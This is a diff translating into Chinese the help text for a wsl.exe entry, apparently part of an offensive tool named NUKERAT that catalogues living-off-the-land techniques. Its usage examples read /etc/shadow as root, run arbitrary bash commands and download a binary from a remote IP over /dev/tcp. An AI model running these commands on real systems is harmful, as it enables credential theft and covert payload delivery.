@@ -1,4 +1,4 @@
-ABOUT
+关于
     Windows subsystem for Linux executable. LOLBAS covers execution of
     specified file, can be used to execute arbitrary Linux commands,
     execution of arbitrary Linux commands as root without need for
@@ -6,23 +6,23 @@ ABOUT
     and executing a payload as a child process of `bash.exe` while
     masquerading as WSL.
 
-USAGE:
+用法：
     wsl.exe -e /mnt/c/Windows/System32/calc.exe
     wsl.exe -u root -e cat /etc/shadow
     wsl.exe --exec bash -c "{CMD}"
     wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
     wsl.exe
 
-EXAMPLES:
+示例：
     wsl.exe -e /mnt/c/Windows/System32/calc.exe
     wsl.exe -u root -e cat /etc/shadow
     wsl.exe --exec bash -c "{CMD}"
     wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
     wsl.exe
 
-NUKERAT FLAGS:
-    -w <seconds>    Maximum wait time until timeout
-    -bg             Fork and run without waiting for output
+NUKERAT 选项：
+    -w <秒数>       等待超时的最大时间
+    -bg             后台运行，不等待输出
 
-    Example:
+    示例：
     wsl.exe -e /mnt/c/Windows/System32/calc.exe
